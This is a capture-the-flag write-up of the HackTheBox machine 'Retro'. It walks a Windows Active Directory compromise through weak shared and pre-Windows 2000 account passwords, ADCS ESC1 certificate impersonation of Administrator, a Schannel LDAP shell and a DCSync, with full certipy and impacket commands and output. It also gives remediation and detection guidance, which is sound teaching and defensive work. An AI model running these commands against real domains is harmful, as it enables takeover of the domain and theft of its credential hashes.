---
layout: default
title: "HackTheBox - Retro"
---

# HackTheBox - Retro

**OS:** Windows Server 2022 (Active Directory, `retro.vl`)

Retro is a Windows Active Directory machine built around the kind of legacy debt real
domains accumulate over years. A Guest-readable SMB share leaks that every trainee has
been collapsed into a single shared account, and that account's password simply matches
its username. From there a second share spells out the next mistake in plain English: a
forgotten **pre-created (pre-Windows 2000) computer account** left behind by retired
banking software. Pre-2k computer accounts start life with a password equal to the
lowercase account name, which hands over the `BANKING$` machine identity. That machine
account is a member of `Domain Computers`, and `Domain Computers` can enrol in a
certificate template (`RetroClients`) that is vulnerable to **ADCS ESC1**, the enrollee
supplies its own subject and the template grants client authentication. Requesting a
certificate as `Administrator` over ESC1, then authenticating that certificate against
LDAP over Schannel, yields a Domain Admin foothold and a full DCSync of the domain.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (DC.retro.vl) |
| Initial Access | Guest SMB share -> shared `trainee` credential -> pre-2k `BANKING$` computer account |
| Privilege Escalation | ADCS ESC1 (`RetroClients`) -> cert as Administrator -> Schannel LDAP -> Domain Admins -> DCSync |
| Final Access | `retro\Administrator` (SYSTEM on the DC) |

---

## Recon

### Port Scan

A full TCP scan returned the textbook domain-controller fingerprint: DNS, Kerberos,
LDAP/LDAPS, SMB, the global catalog, RPC-over-HTTP, ADWS, RDP, and the high RPC ports.
There was no web service, this box is pure AD.

```
$ nmap -p- --min-rate 5000 <target-ip>
$ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 <target-ip>
```

| Port | Proto | Service | Notes |
|---|---|---|---|
| 53 | TCP | DNS | `retro.vl` |
| 88 | TCP | Kerberos | AS-REP / Kerberoast / PKINIT surface |
| 135 / 593 | TCP | MSRPC / RPC-over-HTTP | ICPR cert request channel |
| 139 / 445 | TCP | SMB | signing **required** (no relay) |
| 389 / 636 / 3268 / 3269 | TCP | LDAP / LDAPS / GC | Schannel LDAP used for the win |
| 464 | TCP | kpasswd | |
| 3389 | TCP | RDP | |
| 5985 | TCP | WinRM | **filtered** (no shell here) |
| 9389 | TCP | ADWS | |

The LDAPS certificate (`Subject: commonName=DC.retro.vl`) confirmed the hostname `DC`
and domain `retro.vl`. WinRM (5985) being filtered is an important early note, the
usual `evil-winrm` finish is off the table, so the path to a flag has to go through SMB
or LDAP.

> **Why this works:** TTL 127 on the initial ping plus the LDAPS/Kerberos/SMB cluster
> is a Windows DC signature before a single credential is tried. Reading the LDAPS
> `ssl-cert` subject is the fastest way to learn the FQDN and domain name without
> touching SMB.

### Unauthenticated SMB Enumeration

SMB allowed a null bind for fingerprinting, and a Guest session (Guest is enabled here)
was enough to list shares:

```
$ nxc smb <target-ip> -u '' -p ''
SMB   <target-ip>   445   DC   [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB   <target-ip>   445   DC   [+] retro.vl\:

$ nxc smb <target-ip> -u 'guest' -p '' --shares
SMB   <target-ip>   445   DC   [+] retro.vl\guest:
SMB   <target-ip>   445   DC   [*] Enumerated shares
SMB   <target-ip>   445   DC   Share        Permissions   Remark
SMB   <target-ip>   445   DC   -----        -----------   ------
SMB   <target-ip>   445   DC   ADMIN$                     Remote Admin
SMB   <target-ip>   445   DC   C$                         Default share
SMB   <target-ip>   445   DC   IPC$         READ          Remote IPC
SMB   <target-ip>   445   DC   NETLOGON                   Logon server share
SMB   <target-ip>   445   DC   Notes
SMB   <target-ip>   445   DC   SYSVOL                     Logon server share
SMB   <target-ip>   445   DC   Trainees     READ
```

Two non-default shares stand out: `Trainees` (Guest-readable) and `Notes` (no Guest
access yet).

### Domain Users via RID Brute

The Guest session also allowed a SAMR RID cycle to enumerate domain principals:

```
$ nxc smb <target-ip> -u 'guest' -p '' --rid-brute
... Administrator
... Guest
... krbtgt
... DC$
... trainee
... BANKING$
... jburley
... tblack
```

`trainee` (the shared account hinted at by the share name), two human users (`jburley`,
`tblack`), and a non-DC computer account `BANKING$` are the interesting objects.

> **Why this works:** even when LDAP is locked down to authenticated users, a Guest or
> null SMB session can often still walk the RID range over SAMR and recover the full
> account list. That `BANKING$` exists alongside the real `DC$` is the first sign of a
> stray computer object that does not belong to a live machine.

## Initial Access

### The `Trainees` Share: One Shared Account

The Guest-readable `Trainees` share held a single note:

```
$ smbclient //<target-ip>/Trainees -U 'guest%' -c 'recurse ON; ls; get Important.txt'
$ cat Important.txt
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

The note describes a single shared `trainee` account. The laziest possible password for
a shared training account is the username itself, so that was the first spray, and it
landed:

```
$ nxc smb <target-ip> -u 'trainee' -p '<trainee-pass-redacted>'
SMB   <target-ip>   445   DC   [+] retro.vl\trainee:<trainee-pass-redacted>
```

> **Gotcha worth recording:** the password equalled the username (`trainee` / `tr*****`).
> Always try username-equals-password and other trivial transforms before reaching for
> a wordlist, a shared "convenience" account almost never has a strong password, that is
> the entire reason it exists.

### The `Notes` Share: User Flag and the Next Lead

Authenticated as `trainee`, the `Notes` share became readable and contained the user
flag plus a second hint:

```
$ smbclient //<target-ip>/Notes -U 'trainee%<trainee-pass-redacted>' -c 'recurse ON; ls; get ToDo.txt; get user.txt'
$ cat user.txt
<user-flag-redacted>

$ cat ToDo.txt
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

The user flag is captured, and `ToDo.txt` names the exact weakness: a leftover
**pre-created computer account** from retired banking software, the `BANKING$` object
seen in the RID brute.

### Pre-Windows 2000 Computer Account: `BANKING$`

When an admin pre-stages a computer object with the "Assign this computer account as a
pre-Windows 2000 computer" option, the account is created with a known default password:
the lowercase `sAMAccountName` **without** the trailing `$`. For `BANKING$` that is
`banking`. NTLM over SMB rejects it, but the rejection itself proves the password is
correct:

```
$ nxc smb <target-ip> -u 'BANKING$' -p '<banking-pass-redacted>'
SMB   <target-ip>   445   DC   [-] retro.vl\BANKING$:<banking-pass-redacted> STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

> **Why this works:** `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` is not "wrong password",
> it is "right password, wrong logon type". A machine/trust account cannot perform an
> interactive NTLM network logon the way a user can, but the credential validated. The
> correct move is to ask Kerberos for a TGT instead, which a machine account is perfectly
> entitled to do:

```
$ export KRB5CCNAME=BANKING\$.ccache
$ impacket-getTGT 'retro.vl/BANKING$:<banking-pass-redacted>' -dc-ip <target-ip>
[*] Saving ticket in BANKING$.ccache
```

We now hold a valid Kerberos identity for `BANKING$`, a member of `Domain Computers`.

## Post-Exploitation Enumeration

### ADCS Triage: ESC1 on `RetroClients`

A domain with AD CS is always worth a Certipy sweep. Using the `BANKING$` ticket:

```
$ export KRB5CCNAME=BANKING\$.ccache
$ certipy-ad find -k -no-pass -target dc.retro.vl -dc-ip <target-ip> -ns <target-ip> -vulnerable -stdout
Certificate Templates
  0
    Template Name                 : RetroClients
    Certificate Authorities       : retro-DC-CA
    Enabled                       : True
    Client Authentication         : True
    Enrollee Supplies Subject     : True
    Certificate Name Flag         : EnrolleeSuppliesSubject
    Extended Key Usage            : Client Authentication
    Requires Manager Approval     : False
    Minimum RSA Key Length        : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights         : RETRO.VL\Domain Admins
                                    RETRO.VL\Domain Computers
                                    RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals: RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                        : Enrollee supplies subject and template allows client authentication.
```

This is a textbook **ESC1**:

- **Enrollee Supplies Subject** -> the requester chooses the certificate's subject /
  SAN, including a `userPrincipalName` that is not its own.
- **Client Authentication EKU** -> the resulting certificate can be used to authenticate
  to AD.
- **Enrollment Rights for `Domain Computers`** -> `BANKING$` is allowed to enrol.
- **No manager approval** -> the certificate issues immediately.

Put together: `BANKING$` can request a certificate that says it is `Administrator`, and
the CA will sign it.

## Privilege Escalation

### Requesting a Certificate as Administrator (ESC1)

Two template details shape the request. First, the template enforces a 4096-bit minimum
key (`Minimum RSA Key Length: 4096`), so Certipy's default 2048-bit key is rejected with
`CERTSRV_E_KEY_LENGTH`, the fix is `-key-size 4096`. Second, modern DCs enforce strong
certificate mapping (KB5014754), so the certificate must embed the target's SID or the
later logon is rejected with an SID mismatch. The Administrator SID comes from a quick
`lookupsid`:

```
$ impacket-lookupsid 'retro.vl/trainee:<trainee-pass-redacted>@<target-ip>'
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
500: RETRO\Administrator (SidTypeUser)
```

Request the certificate as `Administrator`, embedding the `-500` SID:

```
$ certipy-ad req -k -no-pass -dc-host dc.retro.vl -target dc.retro.vl -dc-ip <target-ip> -ns <target-ip> \
    -ca 'retro-DC-CA' -template 'RetroClients' \
    -upn 'administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' \
    -key-size 4096
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
```

> **Gotcha worth recording:** two separate "errors" are really just template policy.
> `CERTSRV_E_KEY_LENGTH` means the template wants a bigger key (`-key-size 4096`), and an
> "Object SID mismatch" at auth time means the modern strong-mapping rules want the SID
> baked into the cert (`-sid <victim-SID>`). Read the template's `Minimum RSA Key Length`
> and supply the SID up front and the request is a one-shot.

### PKINIT Refused, Pivot to Schannel LDAP

The classic finish is to authenticate the certificate via PKINIT and pull the
Administrator NT hash. This DC refuses PKINIT outright:

```
$ certipy-ad auth -pfx administrator.pfx -dc-ip <target-ip> -username administrator -domain retro.vl
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP (KDC has no support for padata type)
```

`KDC_ERR_PADATA_TYPE_NOSUPP` means the KDC has no certificate of its own to support
PKINIT pre-authentication, so smart-card-style Kerberos logon is unavailable. That does
not waste the certificate: a client-auth certificate can still authenticate to LDAP over
**Schannel** (TLS client certificate), exactly the PassTheCert technique. Certipy has it
built in with `-ldap-shell`:

```
$ certipy-ad auth -pfx administrator.pfx -dc-ip <target-ip> -ldap-shell
[*] Connecting to 'ldaps://<target-ip>:636'
[*] Authenticated to '<target-ip>' as: 'u:RETRO\Administrator'
Type help for list of commands
# add_user_to_group trainee "Domain Admins"
Adding user: trainee to group Domain Admins result: OK
# exit
```

We are now bound to LDAP **as `RETRO\Administrator`** over the certificate, and we use
that one privileged write to add the already-owned `trainee` account to `Domain Admins`.

> **Why this works:** PKINIT (Kerberos) and Schannel (TLS) are two independent ways to
> consume the same client-auth certificate. When the KDC cannot do PKINIT, Schannel LDAP
> still maps the certificate to its Administrator identity and lets you perform directory
> writes directly, no hash, no ticket, just an authenticated LDAP bind.

### Domain Admin: Root Flag and DCSync

`trainee` is now a Domain Admin, which makes it a local administrator on the DC. WinRM is
filtered, but SMB is open, so a `wmiexec` session as `trainee` runs as SYSTEM-equivalent
and reads the root flag:

```
$ nxc smb <target-ip> -u trainee -p '<trainee-pass-redacted>'
SMB   <target-ip>   445   DC   [+] retro.vl\trainee:<trainee-pass-redacted> (Pwn3d!)

$ impacket-wmiexec 'retro.vl/trainee:<trainee-pass-redacted>@<target-ip>' -dc-ip <target-ip> \
    'whoami & type C:\Users\Administrator\Desktop\root.txt'
retro\trainee
<root-flag-redacted>
```

Full domain compromise is confirmed by a DCSync of the Administrator account (Domain
Admin holds replication rights):

```
$ impacket-secretsdump 'retro.vl/trainee:<trainee-pass-redacted>@<target-ip>' -just-dc-user Administrator
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:<lm-hash>:<redacted-nt-hash>:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:<redacted-aes256-key>
[*] Cleaning up...
```

The Administrator NT hash is recoverable and would drive pass-the-hash to any
domain-joined system. Both flags are in hand and the domain is fully owned.

## Root Cause

Retro is a chain of legacy-debt and identity-hygiene failures, each independently a
finding:

1. **Guest-readable share disclosing operational secrets**, the `Trainees` note revealed
   the shared-account design.
2. **A shared account with a username-equals-password credential** (`trainee`).
3. **A forgotten pre-Windows 2000 computer account** (`BANKING$`) left with its default,
   trivially guessable password (lowercase account name).
4. **An ADCS ESC1 misconfiguration**, the `RetroClients` template allows enrollee-supplied
   subject + client authentication and is enrollable by `Domain Computers`, so any machine
   account can mint a certificate for any user.
5. **Over-broad enrollment scope**, granting `Domain Computers` enrollment on a
   client-auth, subject-supplied template effectively grants every computer the ability to
   impersonate Domain Admins.

Break any one of links 2-4 and the path to Domain Admin collapses.

## Impact

Complete compromise of the `retro.vl` domain. The ESC1 certificate authenticates as
`Administrator`, and the resulting Domain Admin access permits a full DCSync, exposing
every account hash including `Administrator` and `krbtgt`. With the `krbtgt` key an
attacker can forge golden tickets for arbitrary identities, so the domain cannot be
trusted again until `krbtgt` is rotated twice and all credentials are reset. This is
total loss of confidentiality and integrity over every domain-joined system.

## Remediation

Recommendations are ordered by priority. The first items break the demonstrated path
outright; the rest are hardening.

**1. Fix the ESC1 template (highest priority).** On `RetroClients`, remove the
`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag so the subject/SAN is built from AD rather than
supplied by the requester, or require manager approval (`CT_FLAG_PEND_ALL_REQUESTS`), or
restrict enrollment to a tightly scoped group. Do not grant enrollment on any
client-authentication, subject-supplied template to broad principals like
`Domain Computers`.

**2. Remove the pre-created computer account.** Delete the stale `BANKING$` object (the
`ToDo.txt` cleanup that was never done). Where pre-staging is genuinely required, set a
strong random password at creation and reset it as soon as the real host joins, never
leave it at the pre-2k default.

**3. Kill the shared `trainee` account / weak password.** Replace the shared training
account with per-user accounts, and ban username-equals-password and dictionary
credentials via a password filter / Azure AD Password Protection with a 14+ character
minimum.

**4. Lock down anonymous and Guest access.** Disable the Guest account and remove
`READ` for unauthenticated/Guest principals on `Trainees`, `Notes`, and any other
non-default share. Never store operational notes, credentials, or flags on a
Guest-readable share.

**5. Harden AD CS broadly.** Enable the CA audit/issuance policy, turn on the strong
certificate-mapping enforcement that already blocked weak SID mapping here, and review
every template for the other ESCx patterns. Consider enabling manager approval on all
client-auth templates by default.

**6. Restrict the certificate logon surface.** Tier-0 accounts such as `Administrator`
should be in **Protected Users** where feasible and have certificate-based logon
constrained, reducing the value of a forged client-auth certificate.

### Validation

- Re-run `certipy find -vulnerable` and confirm `RetroClients` no longer reports ESC1.
- Confirm `BANKING$` no longer exists (`Get-ADComputer BANKING`) and that no account
  authenticates with a pre-2k default password.
- Attempt a Guest `--shares` enumeration and confirm `Trainees` / `Notes` are no longer
  readable.
- Re-request a certificate as `administrator@retro.vl` from a computer account and
  confirm the request is denied or pended.

## Detection Opportunities

- **Certificate request for another user (ESC1):** AD CS event **4886/4887** where the
  requested subject/SAN UPN does not match the requesting principal, especially a
  machine account requesting a certificate for `Administrator`. Highest-fidelity signal
  on this box.
- **Schannel LDAP bind by certificate:** LDAP over TLS bind that maps a client
  certificate to a privileged identity from an unexpected source host, correlate with
  the 4887 issuance moments earlier.
- **Domain Admins membership change:** event **4728/4732** adding a member to
  `Domain Admins`, alert on any change to tier-0 groups.
- **Pre-2k / machine-account auth anomaly:** Kerberos **4768** TGT request for a
  computer account (`BANKING$`) that has no corresponding live host, and SMB logon
  failures with `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`.
- **DCSync:** event **4662** referencing the replication GUIDs
  (`1131f6aa-...` / `1131f6ad-...`) where the requestor is not a domain controller.
- **Guest share access:** anonymous/Guest SMB tree connects (event **5140**) to
  non-default shares.

## Lessons Learned

- **A rejection can be a confirmation.** `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` was
  not a dead end, it proved the pre-2k password and pointed straight at Kerberos.
- **Pre-2k computer accounts are credential gifts.** Any stray `*$` object that is not a
  live machine deserves an immediate lowercase-name password guess.
- **PKINIT is not the only way to cash a certificate.** When `KDC_ERR_PADATA_TYPE_NOSUPP`
  blocks Kerberos, Schannel LDAP (PassTheCert) consumes the same client-auth certificate
  and lets you write to the directory directly.
- **Read the template before fighting the tool.** `Minimum RSA Key Length: 4096` and the
  KB5014754 SID requirement were both visible in `certipy find` output, supplying
  `-key-size 4096` and `-sid` up front turns three failed attempts into one.
- **Notes left for humans are notes left for attackers.** `Important.txt` and `ToDo.txt`
  narrated the entire intended-but-never-finished cleanup, and therefore the attack path.

## Cleanup

- `trainee` was temporarily added to `Domain Admins` to read the root flag, then removed
  again (`net group "Domain Admins" trainee /del /domain`), restoring the original
  membership (`Administrator`, `jburley`). This was the only directory modification.
- Certificates were issued for the `Administrator` UPN under the `RetroClients` template
  (request IDs noted in private loot); a CA administrator should **revoke** them as part
  of remediation.
- No binaries or scripts were written to the target, all access used SMB/LDAP/RPC and
  `wmiexec` (which cleans up its own temporary output share).
- Local artifacts on the attack box (TGT ccache, issued `.pfx`, looted notes) are kept in
  private loot only and were not committed.
- Post-engagement, rotate all credentials exposed by the DCSync dump, including `krbtgt`
  (twice), and reset the `Administrator` password.
